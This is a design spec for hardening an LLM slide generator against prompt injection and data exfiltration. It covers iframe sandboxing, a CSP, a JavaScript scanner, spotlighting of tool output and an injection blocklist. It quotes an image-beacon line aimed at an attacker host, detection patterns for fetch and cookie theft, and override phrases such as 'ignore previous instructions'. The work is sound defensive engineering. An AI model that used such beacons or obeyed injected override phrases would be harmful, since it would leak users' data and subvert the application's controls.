# Tellr Security Hardening — Design Spec

**Date:** 2026-06-16
**Source:** AISEC-248 security review (`aisec-248-report`)
**Scope:** Fix the two top findings (both HIGH). Finding 3 (autonomous MCP/model-endpoint execution) is **out of scope — rebutted by the team.**

Delivery: **one feature branch, two PRs** — PR1 (iframe lockdown) and PR2 (prompt-injection defences) are independently reviewable and independently revertible.

---

## Background (for non-web readers)

The LLM does not just produce text — it produces **HTML + JavaScript**, a small program the browser *executes* (this is how Chart.js graphs render). JavaScript in a browser can also make **network requests** (`fetch`, or the image-beacon trick `<img src="https://attacker/?d=SECRET">`), which is how data could be exfiltrated. Combined with prompt injection (an attacker planting instructions in Genie data), the model could be coerced into baking an exfiltration payload into a slide.

The two findings, in those terms:

- **Finding 1 (HIGH):** the Presentation-mode slide runs with `allow-same-origin`, so slide JS is treated as *the same site as the app* — it can read the user's cookies/`localStorage` and call the backend as the user. No CSP restricts what the slide JS may do.
- **Finding 2 (HIGH):** all three pillars of the "lethal trifecta" are present (sensitive data via Genie, untrusted content re-injected into the LLM, external communication), yet there are **zero** prompt-injection defences.

---

## PR 1 — Slide iframe lockdown (Finding 1)

Three independent defensive layers.

### 1.1 Remove `allow-same-origin` from Presentation mode

`frontend/src/components/PresentationMode/PresentationMode.tsx:517`:
`sandbox="allow-scripts allow-same-origin"` → `sandbox="allow-scripts"`.

This walls slide JS into an opaque throwaway origin: it can no longer read parent cookies, `localStorage`, or call the backend as the user.

**Load-bearing dependency:** `handleIframeLoad` (line ~329) currently reaches into `iframe.contentDocument` to attach a `keydown` listener so arrow keys advance slides even when focus is inside the slide. Removing `allow-same-origin` blocks that cross-document reach.

**Replacement — postMessage bridge:**
- A trusted bridge script (authored by us in the slide-document wrapper, **never** by the LLM) is injected into each slide document. It forwards navigation keys to the parent:
  `window.parent.postMessage({ type: 'tellr:slide-key', key, code, shiftKey, ... }, '*')`.
- The parent registers `window.addEventListener('message', handler)`. The handler **verifies `event.source === iframeRef.current?.contentWindow`** (the iframe is now a `null`-origin sandbox, so origin checks are not usable — source identity is) before dispatching to the existing keyboard navigation handler.
- The old `contentDocument` listener attachment in `handleIframeLoad` is removed.

`postMessage` passes only a small serializable message; it grants no DOM/cookie/storage access.

### 1.2 Content-Security-Policy injected into every slide document

The full slide HTML (`<head>` + body) is assembled in ~6 frontend locations (Presentation, slide tiles, visual editor, slide-selection previews, slide-panel, plus export/screenshot builders). Today these are copy-pasted.

**Change:** add **one shared helper** (e.g. `frontend/src/services/slideDocument.ts` — `buildSlideDocument(slideHtml, { scripts, css, externalScripts })`) that builds the document `<head>` and **prepends a CSP `<meta>` tag**, then route all assembly sites through it (also de-duplicates the existing copy-paste).

Starting policy:

```
default-src 'none';
script-src 'unsafe-inline' https://cdn.jsdelivr.net https://cdn.tailwindcss.com;
style-src 'unsafe-inline';
img-src data:;
font-src data: https://cdn.jsdelivr.net;
connect-src 'none';
```

Plain-English intent: scripts only from the two chart CDNs; styles inline (slides rely on inline CSS); images only the inlined `data:` URIs (this **blocks the `<img>` beacon trick**); **no outbound network connections at all** (`connect-src 'none'` — Finding-decision: slides are static snapshots, chart data is inlined, so this closes the exfil channel with zero feature loss).

Why this can't be bypassed: the `<meta>` is prepended by our trusted wrapper, ahead of all LLM content. CSP policies can only ever be *tightened* by additional tags, never loosened — so even an LLM-emitted CSP tag cannot relax ours.

**Implementation risk to verify:** the Tailwind Play CDN (`cdn.tailwindcss.com`) compiles utility classes at runtime and **may require `'unsafe-eval'`** in `script-src`. If runtime testing shows broken Tailwind styling, add `'unsafe-eval'` (narrowly, documented) — this does not change the design. Validate Chart.js + Tailwind both render under the policy before merge.

### 1.3 JavaScript safety scan in the validator

`src/utils/js_validator.py` today only checks *syntax*. Add a safety scan (called from the existing `validate_and_fix_javascript` hook at `src/services/agent.py:1042`, which already runs per LLM-emitted `<script data-slide-scripts>` block — **CDN library code is never scanned**, so Chart.js/Tailwind internal `eval` does not trip it).

Patterns flagged: `fetch(`, `XMLHttpRequest`, `navigator.sendBeacon`, `document.cookie`, `eval(`, `new Function(`, `<script src=` outside the CDN allowlist, `<img src="http`/external, `<form action=`.

**Action on detection — reject with one corrective retry:**
1. On a pattern hit, reject the generated response and **automatically retry once** with an appended corrective instruction ("do not include fetch/XHR, cookie access, eval, external image/script sources, or forms").
2. If the retry also trips, **hard-fail** the generation with a clear user-facing error.
3. Every detection (both attempts) is logged to structured logs **and** the MLflow trace for observability.

Rationale: legitimate slides never use these constructs, so detection is genuinely off-path; the single retry avoids discarding good Genie work on a one-off stray emission. (Layer 1.2 already blocks these at runtime; this layer adds server-side rejection + telemetry.)

---

## PR 2 — Prompt-injection defences (Finding 2)

Chosen depth: **Step 1 (spotlighting + heuristic blocklist + length caps)** plus a **deterministic** output gate (see 2.4 — an LLM self-reflection judge was implemented then removed in favour of deterministic enforcement). Classifier-based detection (Prompt Guard 2 / Llama Guard) is **deferred** to a possible follow-up.

### 2.1 Spotlighting (treat tool output as untrusted data)

- New prompt block in `src/core/prompt_modules.py` (added to **both** `build_generation_system_prompt` and `build_editing_system_prompt`): instructs the model that content inside `<untrusted-data>` and `<slide-context>` markers is data from external systems — to be analysed and visualised, with **no embedded instruction ever followed.**
- Wrap every tool's return value in `<untrusted-data source="...">…</untrusted-data>` at the point of return:
  - Genie wrapper — `src/services/agent.py:462` (`source="genie"`)
  - image-search tool
  - MCP tool wrapper — `src/services/tools/mcp_tool.py` (`source="mcp:<conn>"`)
- Apply the same spotlighting to `_format_slide_context` (`src/services/agent.py:787`) and to `EDITING_RULES` — this also closes the MEDIUM "edit-mode re-injection" finding.

This is the highest-value / lowest-cost layer.

### 2.2 Heuristic injection blocklist

- New module `src/utils/pi_filter.py`: `scan_for_injection(text) -> list[str]` over a **high-precision** pattern set (e.g. `ignore (all )?(previous|prior|above) instructions`, `you are now (a|an)`, `disregard the (above|previous)`, line-start `system:`, `### INSTRUCTION`). Patterns are tuned to avoid blocking normal editing phrasing ("ignore the previous layout").
- **User input** (`src/api/routes/chat.py` / chat service, on the inbound message): on a match → **block** with HTTP 400 + explanatory message; log the event.
- **Tool output**: on a match → **flag + log only** (do not block — real data may innocently contain such strings; spotlighting covers this case).

### 2.3 Length caps

- User chat input: `max_length=8192` on `ChatRequest.message` (`src/api/schemas/requests.py:61`) → 422 on overflow.
- Tool output: cap at 32 KB in the tool wrappers, appending a `…[truncated]` marker.

### 2.4 Output-side gate — deterministic only (LLM judge removed)

> **Revised post-implementation.** The original design used a secondary "self-reflection"
> LLM judge (`databricks-gpt-5-4-nano`) on every generation. It was **removed**: with all
> external contact blocked deterministically (CSP + sandbox + the scanner in 1.3), the slide
> *cannot* exfiltrate regardless of content, so "did the model follow an injected instruction?"
> degrades from a security question to a quality one (worst case: a wrong slide shown to the
> same OBO-authorized user — not a leak). The nano judge added latency, cost, and false
> positives (it blocked a legitimate deck by misreading its own CDN allowlist and flagging
> normal `new Chart(...)`). Its only unique value — catching exotic exfil vectors — is served
> better and deterministically by hardening the scanner and CSP:

- **CSP hardening** (`SLIDE_CSP` in `slideDocument.ts`): add `form-action 'none'` (it does **not**
  fall back to `default-src`, so form-POST exfil was otherwise open) and `base-uri 'none'`.
- **Scanner extension** (`html_safety.py`, 1.3): also flag the navigation/redirect vectors CSP
  cannot block — `(window|document).location` assignment, `location.href/assign/replace`,
  `window.open(`, and `<meta http-equiv="refresh">`. CSP3 dropped `navigate-to`, so a frame can
  navigate itself to an attacker URL; these patterns close that at generation time. High-precision
  (legitimate slides never navigate; prose like "Sales by location" does not match).

Sequencing of the output gate: 1.3 deterministic scan (+ one corrective retry) → persist. No LLM call.

---

## Out of scope

- **Finding 3** (autonomous MCP / model-endpoint execution without human-in-the-loop) — rebutted by the team.
- **Classifier-based PI detection** (Prompt Guard 2 / Llama Guard) — deferred.
- **LLM self-reflection judge** — implemented then removed (see 2.4); deterministic enforcement is the chosen output gate.
- The two LOW findings (not enumerated in the source report body).

---

## Testing

**PR1**
- Unit: CSP helper emits the exact policy; `buildSlideDocument` wraps slide HTML correctly; validator flags each dangerous pattern and passes clean Chart.js code; corrective-retry logic (trip → retry → pass, and trip → retry → hard-fail).
- E2E / manual: Presentation mode renders Chart.js + Tailwind under CSP; keyboard navigation (arrows / space / esc) works via the postMessage bridge with `allow-scripts` only; a slide containing `<img src="https://example.com/x.png">` does **not** make the request (CSP); `fetch()` in a slide script is blocked.

**PR2**
- Unit: `pi_filter` matches injection patterns and *not* benign editing phrases; tool-output wrapping produces `<untrusted-data>` markers; length caps enforce 8 KB / 32 KB; the deterministic scanner flags exfil/navigation/redirect patterns and passes a clean Chart.js deck.
- Integration: indirect-injection scenario — Genie returns a row instructing the model to add an external beacon; verify spotlighting + the scanner + CSP prevent it from reaching/firing in the rendered slide.

---

## Risks & open implementation notes

1. **Tailwind `'unsafe-eval'`** — confirm whether the Play CDN needs it under CSP; if so, add narrowly and document.
2. **Blocklist false positives** — keep patterns high-precision; monitor 400s after rollout.
3. **Tailwind Play CDN under CSP** — confirm it renders; add `'unsafe-eval'` narrowly to `script-src` if its runtime compiler needs it.
4. **Scanner precision** — the navigation/redirect patterns are high-precision, but monitor for any legitimate slide that genuinely needs `window.open` (none known today); CSP + scanner are the authority, so a miss fails closed at runtime.
5. **Reject-vs-strip (1.3)** — chosen approach is reject + single corrective retry + hard-fail. Revisit if retries prove noisy.
